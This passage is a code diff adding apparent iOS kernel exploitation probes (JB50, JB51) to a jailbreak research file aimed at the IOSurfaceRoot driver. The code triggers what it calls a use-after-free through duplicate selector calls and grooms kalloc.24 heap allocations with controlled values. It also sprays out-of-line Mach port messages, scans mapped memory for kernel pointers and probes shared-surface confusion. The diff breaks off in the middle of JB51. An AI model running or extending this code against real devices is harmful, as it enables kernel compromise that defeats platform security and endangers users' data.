@@ -38674,3 +38674,1194 @@ void iosurface_adv_extract(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done)
         done(results);
     });
 }
+
+#pragma mark - JB50: Aggressive Multi-Vector Exploitation
+
+void iosurface_aggressive_multivec(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB50: === Aggressive Multi-Vector Exploitation ===");
+
+        void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+        void *iosfh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        (void)h; (void)iosfh;
+
+        int (*sym_call)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*) = dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        int (*sym_async)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*) = dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        unsigned int (*sym_getService)(unsigned int, void*) = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        int (*sym_open)(unsigned int, unsigned int, uint32_t, unsigned int*) = dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        int (*sym_close)(unsigned int) = dlsym(RTLD_DEFAULT, "IOServiceClose");
+        void *(*sym_matching)(const char*) = dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        void (*sym_release)(unsigned int) = dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        int (*sym_mapMem)(unsigned int, uint32_t, unsigned int, uint64_t*, uint64_t*, uint32_t) = dlsym(RTLD_DEFAULT, "IOConnectMapMemory64");
+        int (*sym_unmapMem)(unsigned int, uint32_t, unsigned int, uint64_t, uint64_t) = dlsym(RTLD_DEFAULT, "IOConnectUnmapMemory64");
+        int (*sym_setNotif)(unsigned int, uint32_t, unsigned int, uintptr_t) = dlsym(RTLD_DEFAULT, "IOConnectSetNotificationPort");
+        void *(*sym_surfCreate)(void*) = dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        uint32_t (*sym_surfGetID)(void*) = dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        void *(*sym_surfGetBase)(void*) = dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        int (*sym_surfLock)(void*, uint32_t, uint32_t*) = dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        int (*sym_surfUnlock)(void*, uint32_t, uint32_t*) = dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+        size_t (*sym_surfAllocSize)(void*) = dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        void *(*sym_surfLookup)(uint32_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+        void (*sym_cfRelease)(void*) = dlsym(RTLD_DEFAULT, "CFRelease");
+        int (*sym_vm_dealloc)(unsigned int, uintptr_t, size_t) = dlsym(RTLD_DEFAULT, "vm_deallocate");
+
+        unsigned int self_task = mach_task_self();
+
+        if (!sym_call || !sym_async || !sym_getService || !sym_open || !sym_close || !sym_matching || !sym_release) {
+            log(@"JB50: FATAL: missing IOKit symbols");
+            results[@"verdict"] = @"MISSING_SYMBOLS";
+            done(results);
+            return;
+        }
+
+        log([NSString stringWithFormat:@"JB50: syms mapMem=%d surfCreate=%d setNotif=%d surfLookup=%d", sym_mapMem!=NULL, sym_surfCreate!=NULL, sym_setNotif!=NULL, sym_surfLookup!=NULL]);
+
+        unsigned int svc = sym_getService(0, sym_matching("IOSurfaceRoot"));
+        if (!svc) {
+            log(@"JB50: FATAL: no IOSurfaceRoot");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+        log([NSString stringWithFormat:@"JB50: svc=0x%x", svc]);
+
+        log(@"JB50: ===== M1: IOConnectMapMemory64 Scan (types 0-7) =====");
+        int m1Hits = 0;
+        @try {
+            unsigned int conn = 0;
+            int r = sym_open(svc, self_task, 0, &conn);
+            if (r == 0 && sym_mapMem) {
+                for (uint32_t mt = 0; mt < 8 && !isr_stopped(); mt++) {
+                    uint64_t addr = 0;
+                    uint64_t size = 0;
+                    int mr = sym_mapMem(conn, mt, self_task, &addr, &size, 0);
+                    log([NSString stringWithFormat:@"JB50: [M1] type=%u rc=0x%x addr=0x%llx sz=0x%llx", mt, (uint32_t)mr, addr, size]);
+                    if (mr == 0 && addr != 0 && size > 0) {
+                        m1Hits++;
+                        uint8_t *p = (uint8_t *)(uintptr_t)addr;
+                        uint64_t v0 = 0, v1 = 0, v2 = 0, v3 = 0;
+                        @try {
+                            v0 = *(uint64_t*)p;
+                            v1 = *(uint64_t*)(p + 8);
+                            v2 = *(uint64_t*)(p + 16);
+                            v3 = *(uint64_t*)(p + 24);
+                        } @catch (NSException *ex) { (void)ex; }
+                        log([NSString stringWithFormat:@"JB50: [M1] MAPPED! v0=0x%llx v1=0x%llx v2=0x%llx v3=0x%llx", v0, v1, v2, v3]);
+                        int kptr = 0;
+                        for (int off = 0; off < (int)size && off < 4096; off += 8) {
+                            uint64_t val = *(uint64_t*)(p + off);
+                            if ((val >> 36) == 0xFFFFFFF) kptr++;
+                        }
+                        log([NSString stringWithFormat:@"JB50: [M1] kptrs_in_page=%d", kptr]);
+                        if (sym_unmapMem) sym_unmapMem(conn, mt, self_task, addr, size);
+                    }
+                }
+                sym_close(conn);
+            } else {
+                log([NSString stringWithFormat:@"JB50: [M1] open=0x%x mapMem=%d", (uint32_t)r, sym_mapMem!=NULL]);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M1] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m1_mapMem"] = @(m1Hits);
+        log([NSString stringWithFormat:@"JB50: [M1] done hits=%d", m1Hits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB50: ===== M2: IOSurface Create + Shared Memory Verify =====");
+        int m2Ok = 0;
+        uint32_t surfID = 0;
+        void *surfRef = NULL;
+        @try {
+            if (sym_surfCreate) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @(32),
+                    @"IOSurfaceHeight": @(32),
+                    @"IOSurfaceBytesPerRow": @(128),
+                    @"IOSurfaceBytesPerElement": @(4),
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                    @"IOSurfaceAllocSize": @(4096)
+                };
+                surfRef = sym_surfCreate((__bridge void *)props);
+                if (surfRef) {
+                    surfID = sym_surfGetID(surfRef);
+                    size_t allocSz = sym_surfAllocSize ? sym_surfAllocSize(surfRef) : 0;
+                    log([NSString stringWithFormat:@"JB50: [M2] ref=%p id=%u allocSz=%zu", surfRef, surfID, allocSz]);
+
+                    uint32_t seed = 0;
+                    sym_surfLock(surfRef, 3, &seed);
+                    void *base = sym_surfGetBase(surfRef);
+                    log([NSString stringWithFormat:@"JB50: [M2] base=%p seed=%u", base, seed]);
+
+                    if (base) {
+                        uint64_t *bp = (uint64_t *)base;
+                        bp[0] = 0xDEADBEEFCAFEBABE;
+                        bp[1] = 0x4141414142424242;
+                        bp[2] = (uint64_t)surfID;
+                        bp[3] = 0x1122334455667788;
+                        if (bp[0] == 0xDEADBEEFCAFEBABE && bp[3] == 0x1122334455667788) {
+                            m2Ok = 1;
+                            log(@"JB50: [M2] SHARED MEM OK — write/read verified");
+                        }
+                    }
+                    sym_surfUnlock(surfRef, 3, &seed);
+                } else {
+                    log(@"JB50: [M2] IOSurfaceCreate NULL");
+                }
+            } else {
+                log(@"JB50: [M2] IOSurfaceCreate unavailable");
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M2] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m2_sharedMem"] = @(m2Ok);
+        results[@"m2_surfID"] = @(surfID);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB50: ===== M3: MapMemory on Cross-Conn Groomed =====");
+        int m3Hits = 0;
+        @try {
+            if (sym_mapMem) {
+                unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+                int r1 = sym_open(svc, self_task, 0, &conn1);
+                int r2 = sym_open(svc, self_task, 0, &conn2);
+                int r3 = sym_open(svc, self_task, 0, &gConn);
+                if (r1 == 0 && r2 == 0 && r3 == 0) {
+                    unsigned int wp = jb41_newWakePort();
+                    uint64_t in[3] = {60000, 0, 0};
+
+                    jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                    unsigned int gPorts[32];
+                    int gCount = 0;
+                    memset(gPorts, 0, sizeof(gPorts));
+                    jb42_groomWithFields(gConn, 0x00000001, surfID, 0xCAFEBABE, 0x99999999, 24, 32, gPorts, &gCount, sym_async);
+
+                    int dupRc = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                    log([NSString stringWithFormat:@"JB50: [M3] dup=0x%x groom=%d", (uint32_t)dupRc, gCount]);
+
+                    if (dupRc == 0) {
+                        for (uint32_t mt = 0; mt < 4; mt++) {
+                            uint64_t addr = 0, size = 0;
+                            int mr = sym_mapMem(conn2, mt, self_task, &addr, &size, 0);
+                            if (mr == 0 && addr != 0) {
+                                m3Hits++;
+                                uint64_t v0 = *(uint64_t*)(uintptr_t)addr;
+                                log([NSString stringWithFormat:@"JB50: [M3] MAPPED type=%u addr=0x%llx sz=0x%llx v0=0x%llx", mt, addr, size, v0]);
+                                if (sym_unmapMem) sym_unmapMem(conn2, mt, self_task, addr, size);
+                            } else {
+                                log([NSString stringWithFormat:@"JB50: [M3] type=%u rc=0x%x", mt, (uint32_t)mr]);
+                            }
+                        }
+                    }
+
+                    jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                    jb41_dropPort(wp);
+                    sym_close(conn1);
+                    sym_close(conn2);
+                    sym_close(gConn);
+                }
+            } else {
+                log(@"JB50: [M3] IOConnectMapMemory64 unavailable");
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M3] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m3_mapGroomed"] = @(m3Hits);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB50: ===== M4: NotificationPort After Cross-Conn =====");
+        int m4Hits = 0;
+        @try {
+            if (sym_setNotif) {
+                unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+                int r1 = sym_open(svc, self_task, 0, &conn1);
+                int r2 = sym_open(svc, self_task, 0, &conn2);
+                int r3 = sym_open(svc, self_task, 0, &gConn);
+                if (r1 == 0 && r2 == 0 && r3 == 0) {
+                    unsigned int wp = jb41_newWakePort();
+                    unsigned int notifPort = jb41_newWakePort();
+                    uint64_t in[3] = {61000, 0, 0};
+
+                    jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+                    unsigned int gPorts[32];
+                    int gCount = 0;
+                    memset(gPorts, 0, sizeof(gPorts));
+                    jb42_groomWithFields(gConn, 0x00000001, 0xDEAD0050, 0xCAFEBABE, 0x99999999, 24, 32, gPorts, &gCount, sym_async);
+                    int dupRc = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                    log([NSString stringWithFormat:@"JB50: [M4] dup=0x%x", (uint32_t)dupRc]);
+
+                    if (dupRc == 0) {
+                        for (uint32_t nType = 0; nType < 4; nType++) {
+                            int nr = sym_setNotif(conn2, nType, notifPort, 0x50505050 + nType);
+                            log([NSString stringWithFormat:@"JB50: [M4] setNotif type=%u rc=0x%x", nType, (uint32_t)nr]);
+                            if (nr == 0) m4Hits++;
+                        }
+
+                        if (m4Hits > 0) {
+                            struct { mach_msg_header_t hdr; uint8_t body[256]; } nmsg;
+                            memset(&nmsg, 0, sizeof(nmsg));
+                            nmsg.hdr.msgh_size = sizeof(nmsg);
+                            nmsg.hdr.msgh_local_port = notifPort;
+                            int mr = mach_msg(&nmsg.hdr, 2 | 0x100, 0, sizeof(nmsg), notifPort, 500, 0);
+                            log([NSString stringWithFormat:@"JB50: [M4] recv mr=0x%x id=0x%x", (uint32_t)mr, nmsg.hdr.msgh_id]);
+                            if (mr == 0) {
+                                uint64_t *bp = (uint64_t *)nmsg.body;
+                                log([NSString stringWithFormat:@"JB50: [M4] NOTIF: 0x%llx 0x%llx 0x%llx 0x%llx", bp[0], bp[1], bp[2], bp[3]]);
+                            }
+                        }
+                    }
+
+                    jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                    jb41_dropPort(notifPort);
+                    jb41_dropPort(wp);
+                    sym_close(conn1);
+                    sym_close(conn2);
+                    sym_close(gConn);
+                }
+            } else {
+                log(@"JB50: [M4] IOConnectSetNotificationPort unavailable");
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M4] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m4_notifPort"] = @(m4Hits);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB50: ===== M5: IOServiceOpen Types 1-4 =====");
+        int m5Hits = 0;
+        @try {
+            for (uint32_t ucType = 1; ucType <= 4 && !isr_stopped(); ucType++) {
+                unsigned int altConn = 0;
+                int openRc = sym_open(svc, self_task, ucType, &altConn);
+                log([NSString stringWithFormat:@"JB50: [M5] type=%u open=0x%x conn=0x%x", ucType, (uint32_t)openRc, altConn]);
+                if (openRc == 0 && altConn != 0) {
+                    m5Hits++;
+                    for (uint32_t sel = 0; sel < 6; sel++) {
+                        uint64_t outScalar[4] = {0};
+                        uint32_t outCnt = 4;
+                        uint8_t outStruct[64];
+                        memset(outStruct, 0, sizeof(outStruct));
+                        size_t outSz = sizeof(outStruct);
+                        uint64_t inScalar[2] = {0, 0};
+                        int sr = sym_call(altConn, sel, inScalar, 2, NULL, 0, outScalar, &outCnt, outStruct, &outSz);
+                        if (sr == 0 || outScalar[0] != 0) {
+                            log([NSString stringWithFormat:@"JB50: [M5] type=%u sel=%u rc=0x%x sc0=0x%llx", ucType, sel, (uint32_t)sr, outScalar[0]]);
+                        }
+                    }
+                    if (sym_mapMem) {
+                        uint64_t addr = 0, size = 0;
+                        int mr = sym_mapMem(altConn, 0, self_task, &addr, &size, 0);
+                        log([NSString stringWithFormat:@"JB50: [M5] type=%u mapMem=0x%x addr=0x%llx", ucType, (uint32_t)mr, addr]);
+                        if (mr == 0 && addr != 0) {
+                            uint64_t v0 = *(uint64_t*)(uintptr_t)addr;
+                            log([NSString stringWithFormat:@"JB50: [M5] MAPPED v0=0x%llx", v0]);
+                            if (sym_unmapMem) sym_unmapMem(altConn, 0, self_task, addr, size);
+                        }
+                    }
+                    sym_close(altConn);
+                }
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M5] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m5_altTypes"] = @(m5Hits);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB50: ===== M6: OOL Port Spray kalloc.24 =====");
+        int m6Hits = 0;
+        @try {
+            unsigned int sprayPorts[8];
+            for (int i = 0; i < 8; i++) sprayPorts[i] = jb41_newWakePort();
+
+            unsigned int holdPorts[64];
+            for (int i = 0; i < 64; i++) holdPorts[i] = jb41_newWakePort();
+
+            unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+            int r1 = sym_open(svc, self_task, 0, &conn1);
+            int r2 = sym_open(svc, self_task, 0, &conn2);
+            int r3 = sym_open(svc, self_task, 0, &gConn);
+
+            if (r1 == 0 && r2 == 0 && r3 == 0) {
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {62000, 0, 0};
+
+                jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                typedef struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_ports_descriptor_t ool;
+                } jb50_ool_send_t;
+
+                int sendOk = 0;
+                for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                    jb50_ool_send_t msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                    msg.hdr.msgh_size = sizeof(msg);
+                    msg.hdr.msgh_remote_port = holdPorts[i];
+                    msg.hdr.msgh_local_port = 0;
+                    msg.hdr.msgh_id = 0x50500000 + i;
+                    msg.body.msgh_descriptor_count = 1;
+                    msg.ool.address = (void *)sprayPorts;
+                    msg.ool.count = 3;
+                    msg.ool.deallocate = 0;
+                    msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+                    msg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+                    msg.ool.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+                    int mr = mach_msg(&msg.hdr, 1 | 0x10, sizeof(msg), 0, 0, 100, 0);
+                    if (mr == 0) sendOk++;
+                }
+                log([NSString stringWithFormat:@"JB50: [M6] sent=%d/64 OOL port msgs", sendOk]);
+
+                unsigned int gPorts[32];
+                int gCount = 0;
+                memset(gPorts, 0, sizeof(gPorts));
+                jb42_groomWithFields(gConn, 0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD, 24, 32, gPorts, &gCount, sym_async);
+
+                int dupRc = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                log([NSString stringWithFormat:@"JB50: [M6] dup=0x%x groom=%d", (uint32_t)dupRc, gCount]);
+
+                for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                    typedef struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_ports_descriptor_t ool;
+                        mach_msg_trailer_t trailer;
+                    } jb50_ool_recv_t;
+
+                    jb50_ool_recv_t rmsg;
+                    memset(&rmsg, 0, sizeof(rmsg));
+                    rmsg.hdr.msgh_size = sizeof(rmsg);
+                    rmsg.hdr.msgh_local_port = holdPorts[i];
+
+                    int mr = mach_msg(&rmsg.hdr, 2 | 0x100, 0, sizeof(rmsg), holdPorts[i], 50, 0);
+                    if (mr == 0 && rmsg.ool.address && rmsg.ool.count >= 3) {
+                        unsigned int *ports = (unsigned int *)rmsg.ool.address;
+                        for (uint32_t p = 0; p < rmsg.ool.count && p < 3; p++) {
+                            int found = 0;
+                            for (int s = 0; s < 8; s++) {
+                                if (ports[p] == sprayPorts[s]) { found = 1; break; }
+                            }
+                            if (ports[p] == 0) found = 1;
+                            if (ports[p] == (unsigned int)(-1)) found = 1;
+                            if (!found) {
+                                m6Hits++;
+                                log([NSString stringWithFormat:@"JB50: [M6] ANOMALY msg=%d port[%u]=0x%x", i, p, ports[p]]);
+                            }
+                        }
+                        if (sym_vm_dealloc) {
+                            sym_vm_dealloc(self_task, (uintptr_t)rmsg.ool.address, rmsg.ool.count * sizeof(unsigned int));
+                        }
+                    }
+                }
+
+                jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                jb42_freeGroom(gPorts, gCount);
+                jb41_dropPort(wp);
+                sym_close(conn1);
+                sym_close(conn2);
+                sym_close(gConn);
+            }
+
+            for (int i = 0; i < 64; i++) jb41_dropPort(holdPorts[i]);
+            for (int i = 0; i < 8; i++) jb41_dropPort(sprayPorts[i]);
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M6] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m6_oolAnomaly"] = @(m6Hits);
+        log([NSString stringWithFormat:@"JB50: [M6] done anomalies=%d", m6Hits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB50: ===== M7: IOSurfaceLookup Confusion =====");
+        int m7Hits = 0;
+        @try {
+            if (sym_surfLookup && surfID > 0) {
+                unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+                int r1 = sym_open(svc, self_task, 0, &conn1);
+                int r2 = sym_open(svc, self_task, 0, &conn2);
+                int r3 = sym_open(svc, self_task, 0, &gConn);
+                if (r1 == 0 && r2 == 0 && r3 == 0) {
+                    unsigned int wp = jb41_newWakePort();
+                    uint64_t regId = (uint64_t)surfID;
+                    uint64_t in[3] = {regId, 0, 0};
+
+                    jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                    unsigned int gPorts[32];
+                    int gCount = 0;
+                    memset(gPorts, 0, sizeof(gPorts));
+                    jb42_groomWithFields(gConn, surfID, 0xDEAD0050, 0xCAFEBABE, 0x99999999, 24, 32, gPorts, &gCount, sym_async);
+
+                    int dupRc = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                    log([NSString stringWithFormat:@"JB50: [M7] dup=0x%x surfID=%u", (uint32_t)dupRc, surfID]);
+
+                    if (dupRc == 0) {
+                        void *lookupRef = sym_surfLookup(surfID);
+                        if (lookupRef) {
+                            uint32_t lid = sym_surfGetID(lookupRef);
+                            size_t lsz = sym_surfAllocSize ? sym_surfAllocSize(lookupRef) : 0;
+                            void *lbase = sym_surfGetBase(lookupRef);
+                            log([NSString stringWithFormat:@"JB50: [M7] lookup ref=%p id=%u sz=%zu base=%p", lookupRef, lid, lsz, lbase]);
+
+                            if (lbase) {
+                                uint64_t *bp = (uint64_t *)lbase;
+                                log([NSString stringWithFormat:@"JB50: [M7] data: 0x%llx 0x%llx 0x%llx 0x%llx", bp[0], bp[1], bp[2], bp[3]]);
+                                if (bp[0] != 0xDEADBEEFCAFEBABE) {
+                                    m7Hits++;
+                                    log(@"JB50: [M7] CONFUSION — shared mem markers changed!");
+                                }
+                            }
+                        } else {
+                            log(@"JB50: [M7] IOSurfaceLookup NULL — ID not found");
+                        }
+                    }
+
+                    jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                    jb41_dropPort(wp);
+                    sym_close(conn1);
+                    sym_close(conn2);
+                    sym_close(gConn);
+                }
+            } else {
+                log([NSString stringWithFormat:@"JB50: [M7] surfLookup=%d surfID=%u", sym_surfLookup!=NULL, surfID]);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB50: [M7] EXCEPTION: %@", e.reason]);
+        }
+        results[@"m7_surfConfusion"] = @(m7Hits);
+
+        if (surfRef && sym_cfRelease) {
+            sym_cfRelease(surfRef);
+        }
+
+        sym_release(svc);
+
+        NSString *verdict;
+        if (m1Hits > 0) verdict = @"MAP_MEMORY_HIT";
+        else if (m3Hits > 0) verdict = @"GROOMED_MAP_HIT";
+        else if (m6Hits > 0) verdict = @"OOL_PORT_CONFUSION";
+        else if (m7Hits > 0) verdict = @"SURF_CONFUSION";
+        else if (m4Hits > 0) verdict = @"NOTIF_PORT_SET";
+        else if (m5Hits > 0) verdict = @"ALT_TYPE_OPENED";
+        else if (m2Ok > 0) verdict = @"SHARED_MEM_ONLY";
+        else verdict = @"NO_NEW_VECTOR";
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB50: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB50-aggressive-checkpoint.json", results);
+        done(results);
+    });
+}
+
+#pragma mark - JB51: Shared Memory Kernel Oracle + PDF OOB + Combined Chain
+
+void iosurface_shmem_kernel_oracle(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB51: === Shared Memory Kernel Oracle + PDF OOB + Combined Chain ===");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB51";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef void*(*surfcreate_fn)(void*);
+        typedef uint32_t(*surfgetid_fn)(void*);
+        typedef void*(*surfgetbase_fn)(void*);
+        typedef int(*surflock_fn)(void*, uint32_t, uint32_t*);
+        typedef int(*surfunlock_fn)(void*, uint32_t, uint32_t*);
+        typedef size_t(*surfgetalloc_fn)(void*);
+        typedef void*(*surflookup_fn)(uint32_t);
+        typedef void(*cfrelease_fn)(void*);
+        typedef void*(*surfcopyval_fn)(void*, void*);
+        typedef void(*surfsetval_fn)(void*, void*, void*);
+        typedef void(*surfremval_fn)(void*, void*);
+        typedef void*(*surfcopyallval_fn)(void*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        surfcreate_fn sym_surfCreate = (surfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        surfgetid_fn sym_surfGetID = (surfgetid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        surfgetbase_fn sym_surfGetBase = (surfgetbase_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        surflock_fn sym_surfLock = (surflock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        surfunlock_fn sym_surfUnlock = (surfunlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+        surfgetalloc_fn sym_surfGetAlloc = (surfgetalloc_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        surflookup_fn sym_surfLookup = (surflookup_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+        cfrelease_fn sym_cfRelease = (cfrelease_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+        surfcopyval_fn sym_surfCopyVal = (surfcopyval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+        surfsetval_fn sym_surfSetVal = (surfsetval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        surfremval_fn sym_surfRemVal = (surfremval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceRemoveValue");
+        surfcopyallval_fn sym_surfCopyAll = (surfcopyallval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+
+        int hasPropFns = (sym_surfCopyVal && sym_surfSetVal && sym_surfRemVal) ? 1 : 0;
+        log([NSString stringWithFormat:@"JB51: syms prop=%d copyAll=%d", hasPropFns, sym_surfCopyAll != NULL]);
+
+        void *match = sym_matching("IOSurfaceRoot");
+        unsigned int svc = sym_getmatch(0, match);
+        log([NSString stringWithFormat:@"JB51: svc=0x%x", svc]);
+
+        if (!svc || !sym_surfCreate) {
+            log(@"JB51: FATAL — no svc or surfCreate");
+            results[@"verdict"] = @"NO_SVC";
+            done(results);
+            return;
+        }
+
+        int n1Hits = 0, n2Hits = 0, n3Hits = 0, n4Hits = 0, n5Hits = 0;
+
+        // ===== N1: IOSurface Property Oracle =====
+        log(@"JB51: ===== N1: IOSurface Property Oracle =====");
+        @try {
+            NSDictionary *surfProps = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceAllocSize": @(4096)
+            };
+            void *surfRef = sym_surfCreate((__bridge void *)surfProps);
+            if (surfRef) {
+                uint32_t surfID = sym_surfGetID(surfRef);
+                log([NSString stringWithFormat:@"JB51: [N1] surfID=%u", surfID]);
+
+                if (hasPropFns) {
+                    CFStringRef testKey = CFSTR("JB51_TestProp");
+                    CFNumberRef testVal = NULL;
+                    int32_t v1 = 0xDEAD;
+                    testVal = CFNumberCreate(NULL, kCFNumberSInt32Type, &v1);
+                    sym_surfSetVal(surfRef, testKey, testVal);
+                    if (testVal) CFRelease(testVal);
+
+                    void *readBack = sym_surfCopyVal(surfRef, testKey);
+                    if (readBack) {
+                        int32_t v2 = 0;
+                        if (CFNumberGetValue(readBack, kCFNumberSInt32Type, &v2)) {
+                            log([NSString stringWithFormat:@"JB51: [N1] setProp=0x%x readBack=0x%x match=%d", v1, v2, v1 == v2]);
+                            if (v1 == v2) n1Hits++;
+                        }
+                        CFRelease(readBack);
+                    }
+
+                    // Now test: do UAF, set prop on dangling, see if it corrupts
+                    unsigned int conn1 = 0, conn2 = 0, groomConn = 0;
